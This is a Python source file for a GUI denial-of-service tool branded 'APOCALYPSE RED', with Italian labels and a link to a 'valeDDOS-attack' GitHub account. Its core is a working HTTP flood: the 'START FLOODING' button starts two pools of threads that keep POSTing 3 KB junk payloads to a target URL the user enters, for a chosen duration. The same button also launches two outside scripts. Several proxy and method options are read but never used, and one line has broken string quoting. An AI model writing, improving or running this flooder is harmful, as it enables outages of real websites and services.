import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import threading
import requests
import random
import time
from urllib.parse import urlparse
import webbrowser
import subprocess

attack_active = False
attack_lock = threading.Lock()

# Apocalypse status fields
status1 = {"Idle": 0, "Connecting": 0, "Requesting": 0, "Downloading": 0, "Downloaded": 0, "Requested": 0, "Failed": 0}
status2 = {"Idle": 0, "Connecting": 0, "Requesting": 0, "Downloading": 0, "Downloaded": 0, "Requested": 0, "Failed": 0}

# === COLORS ===
BG_MAIN = "#0d0d0d"
FG_BOX = "red"
FG_LABEL = "#ff8800"
FG_BTN = "red"
FG_TITLE = "red"
FG_TEXT = "#ffffff"
FG_BAR = "#ff8800"  # Yellow for status bars
FG_ENTRY = "#181818"
FONT_LOIC = ("Segoe UI", 13, "bold")  # LOIC font, use Arial or Segoe UI if you don't have 'LOIC'
BORDER = 2

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def send_3kb_request(target, stat):
    try:
        payload = b'A' * 3072
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/octet-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        }
        stat["Requesting"] += 1
        stat["Requested"] += 1
        update_status_bars()
        response = requests.post(target, data=payload, headers=headers, timeout=3)
        stat["Downloading"] += 1
        update_status_bars()
        if response.status_code == 200:
            stat["Downloaded"] += 1
            update_status_bars()
            return True
        else:
            stat["Failed"] += 1
            update_status_bars()
            return False
    except:
        stat["Failed"] += 1
        update_status_bars()
        return False
    finally:
        stat["Requesting"] -= 1
        stat["Downloading"] = max(0, stat["Downloading"]-1)
        update_status_bars()

def fast_3kb_attack(target, stat, threads):
    global attack_active
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    def runner():
        while attack_active:
            stat["Connecting"] += 1
            update_status_bars()
            send_3kb_request(target, stat)
            stat["Connecting"] -= 1
            update_status_bars()
            time.sleep(random.uniform(0.01, 0.05))
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=runner, daemon=True)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def update_status_bars():
    def bar_txt(stat):
        return "  ".join(f"{k}: {stat[k]}" for k in stat)
    label_status1.config(text=bar_txt(status1))
    label_status2.config(text=bar_txt(status2))

def reset_status():
    for key in status1:
        status1[key] = 0
        status2[key] = 0
    update_status_bars()

def start_test():
    global attack_active
    with attack_lock:
        if attack_active:
            messagebox.showinfo("Info", "Attacco già in esecuzione!")
            return
        attack_active = True
    reset_status()

    target = entry_url.get().strip()
    threads = int(entry_threads.get().strip() or 10)
    duration = int(entry_duration.get().strip() or 60)

    # Optionals
    payload_size = entry_payload.get().strip()
    method = entry_method.get().strip().upper()
    socks_type = entry_socks_type.get().strip()
    proxylist = entry_proxylist.get().strip()
    rpc = entry_rpc.get().strip()
    custom_args = entry_custom_args.get().strip()

    if not target:
        messagebox.showerror("Errore", "Inserisci un URL o IP valido.")
        with attack_lock:
            attack_active = False
        return
    if not is_valid_url(target) and not target.replace('.', '').isdigit():
        messagebox.showerror("Errore", "Inserisci un URL valido (es: http://example.com).")
        with attack_lock:
            attack_active = False
        return

    def run_attack():
        t1 = threading.Thread(target=lambda: fast_3kb_attack(target, status1, threads), daemon=True)
        t2 = threading.Thread(target=lambda: fast_3kb_attack(target, status2, threads), daemon=True)
        t1.start()
        t2.start()
        start_time = time.time()
        while attack_active and (time.time() - start_time) < duration:
            time.sleep(0.1)
        stop_test()
    threading.Thread(target=run_attack, daemon=True).start()

def stop_test():
    global attack_active
    with attack_lock:
        attack_active = False

def open_github(event):
    webbrowser.open_new("https://github.com/valeDDOS-attack")

def run_stress_core():
    subprocess.Popen(["python", "stress_core.py"])

def run_dos():
    subprocess.Popen(["python", "dos.py"])

root = tk.Tk()
root.title("APOCALYPSE")
root.geometry("1100x650")
root.configure(bg=BG_MAIN)
root.resizable(False, False)

# --- Left: logo & image
left_frame = tk.Frame(root, width=220, height=650, bg=BG_MAIN, highlightbackground=FG_BOX, highlightthickness=2)
left_frame.pack(side="left", fill="y")
left_frame.pack_propagate(0)
tk.Label(left_frame, text="APOCALYPSE\nRED", font=("OCR A Extended",24,"bold"), fg=FG_TITLE, bg=BG_MAIN, justify="center").pack(pady=(18,10))
try:
    img = Image.open(""iStock-1251385553-1.webp"").resize((170, 120))
    photo = ImageTk.PhotoImage(img)
    tk.Label(left_frame, image=photo, bg=BG_MAIN).pack(pady=(8,8))
except Exception:
    tk.Label(left_frame, text="[NO IMAGE]", fg=FG_TITLE, bg=BG_MAIN).pack(pady=(8,8))
tk.Label(left_frame, text="github.com/valeDDOS-attack", font=("Consolas",10), fg=FG_LABEL, bg=BG_MAIN, cursor="hand2").pack(side="bottom", pady=10)
tk.Label(left_frame, text="github.com/valeDDOS-attack", font=("Consolas",10), fg=FG_LABEL, bg=BG_MAIN, cursor="hand2").bind("<Button-1>", open_github)

# --- Right: Main controls
right_frame = tk.Frame(root, bg=BG_MAIN)
right_frame.pack(side="left", fill="both", expand=True)

# ---- 1. Select target ----
select_frame = tk.LabelFrame(right_frame, text=" 1. Select your target ", bg=BG_MAIN, fg=FG_LABEL, font=FONT_LOIC, bd=BORDER, relief="groove", highlightbackground=FG_BOX, highlightcolor=FG_BOX)
select_frame.pack(fill="x", padx=18, pady=(16,4), ipady=2)
tk.Label(select_frame, text="URL", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=0, column=0, sticky="w", padx=6, pady=2)
entry_url = tk.Entry(select_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=42, insertbackground="red", borderwidth=2, relief="sunken")
entry_url.grid(row=0, column=1, sticky="we", padx=2, pady=2)
tk.Button(select_frame, text="Lock on", font=FONT_LOIC, bg=FG_BOX, fg="#fff", width=8, relief="ridge", command=lambda: None).grid(row=0, column=2, padx=6)
select_frame.grid_columnconfigure(1, weight=1)

# ---- 2. Ready? ----
ready_frame = tk.LabelFrame(right_frame, text=" 2. Ready? ", bg=BG_MAIN, fg=FG_LABEL, font=FONT_LOIC, bd=BORDER, relief="groove", highlightbackground=FG_BOX, highlightcolor=FG_BOX)
ready_frame.pack(fill="x", padx=18, pady=(0,4))
btn_stop = tk.Button(ready_frame, text="Stop flooding", font=FONT_LOIC, bg=FG_BTN, fg="#fff", width=22, height=2, relief="raised", bd=3, command=stop_test)
btn_stop.pack(side="right", padx=14, pady=4)

# ---- Selected target (shows URL) ----
selected_frame = tk.LabelFrame(right_frame, text=" Selected target ", bg=BG_MAIN, fg=FG_LABEL, font=FONT_LOIC, bd=BORDER, relief="groove", highlightbackground=FG_BOX, highlightcolor=FG_BOX)
selected_frame.pack(fill="x", padx=18, pady=(0,4))
target_big = tk.Label(selected_frame, text="---", font=("Consolas", 33, "bold"), fg="red", bg=FG_ENTRY, height=1)
target_big.pack(fill="x", padx=8, pady=10)
def update_target_big(*args):
    target_big.config(text=entry_url.get())
entry_url.bind("<KeyRelease>", update_target_big)

# ---- 3. Apocalypse options (full
# ---- 3. Apocalypse options (full) ----
attackopt_frame = tk.LabelFrame(right_frame, text=" 3. Apocalypse attack options ", bg=BG_MAIN, fg=FG_LABEL, font=FONT_LOIC, bd=BORDER, relief="groove", highlightbackground=FG_BOX, highlightcolor=FG_BOX)
attackopt_frame.pack(fill="x", padx=18, pady=(0,4), ipady=3)

# Riga 1
tk.Label(attackopt_frame, text="Durata (s):", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=0, column=0, padx=7)
entry_duration = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=8, insertbackground="red", borderwidth=2, relief="sunken")
entry_duration.insert(0, "60")
entry_duration.grid(row=0, column=1, padx=2)

tk.Label(attackopt_frame, text="Payload Size:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=0, column=2, padx=7)
entry_payload = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=10, insertbackground="red", borderwidth=2, relief="sunken")
entry_payload.insert(0, "10MB")
entry_payload.grid(row=0, column=3, padx=2)

tk.Label(attackopt_frame, text="Metodo:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=0, column=4, padx=7)
entry_method = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=9, insertbackground="red", borderwidth=2, relief="sunken")
entry_method.insert(0, "GET")
entry_method.grid(row=0, column=5, padx=2)

tk.Label(attackopt_frame, text="SOCKS Type:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=0, column=6, padx=7)
entry_socks_type = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=8, insertbackground="red", borderwidth=2, relief="sunken")
entry_socks_type.insert(0, "1")
entry_socks_type.grid(row=0, column=7, padx=2)

# Riga 2
tk.Label(attackopt_frame, text="Proxylist:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=1, column=0, padx=7)
entry_proxylist = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=14, insertbackground="red", borderwidth=2, relief="sunken")
entry_proxylist.insert(0, "http.txt")
entry_proxylist.grid(row=1, column=1, padx=2)

tk.Label(attackopt_frame, text="RPC:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=1, column=2, padx=7)
entry_rpc = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=8, insertbackground="red", borderwidth=2, relief="sunken")
entry_rpc.insert(0, "64")
entry_rpc.grid(row=1, column=3, padx=2)

tk.Label(attackopt_frame, text="Threads:", font=FONT_LOIC, fg=FG_TEXT, bg=BG_MAIN).grid(row=1, column=4, padx=7)
entry_threads = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=8, insertbackground="red", borderwidth=2, relief="sunken")
entry_threads.insert(0, "10")
entry_threads.grid(row=1, column=5, padx=2)

tk.Label(attackopt_frame, text="CLI Opzioni:", font=FONT_LOIC, fg="#999999", bg=BG_MAIN).grid(row=1, column=6, padx=7)
entry_custom_args = tk.Entry(attackopt_frame, font=FONT_LOIC, fg="red", bg=FG_ENTRY, width=22, insertbackground="red", borderwidth=2, relief="sunken")
entry_custom_args.grid(row=1, column=7, padx=2)

# --- Status bars (bottom)
status_frame = tk.Frame(right_frame, bg=BG_MAIN, highlightbackground=FG_BOX, highlightthickness=2, padx=4, pady=6)
status_frame.pack(side="bottom", fill="x", padx=18, pady=12)

STAT_FONT = ("Consolas", 12, "bold")
label_status1 = tk.Label(status_frame, text="", font=STAT_FONT, fg=FG_BAR, bg=FG_ENTRY, anchor="w", justify="left")
label_status1.pack(fill="x", pady=3)
label_status2 = tk.Label(status_frame, text="", font=STAT_FONT, fg=FG_BAR, bg=FG_ENTRY, anchor="w", justify="left")
label_status2.pack(fill="x", pady=3)

# --- Start Button (center, in options area)
btn_start = tk.Button(attackopt_frame, text="START FLOODING", font=FONT_LOIC,
                      fg="#fff", bg=FG_BTN, width=18, height=1, relief="raised", bd=4,
                      activeforeground="#fff", activebackground="#b30000",
                      command=lambda: [start_test(), run_stress_core(), run_dos()])
btn_start.grid(row=2, column=0, columnspan=8, pady=10)

update_status_bars()
root.mainloop()

